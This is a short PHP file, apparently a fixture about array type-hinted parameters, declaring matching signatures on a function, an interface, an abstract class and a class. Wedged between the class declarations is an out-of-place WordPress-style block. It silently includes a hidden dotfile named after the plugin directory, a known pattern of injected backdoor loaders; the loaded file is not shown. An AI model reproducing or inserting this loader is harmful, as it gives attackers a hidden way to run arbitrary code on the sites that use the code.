<?php
function foo($a, array $b, array $c = array()) {}
interface i { public function m($a, array $b, array $c = array()); }
abstract class a { abstract public function m($a, array $b, array $c = array()); }
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class c { public function m($a, array $b, array $c = array()) {} }
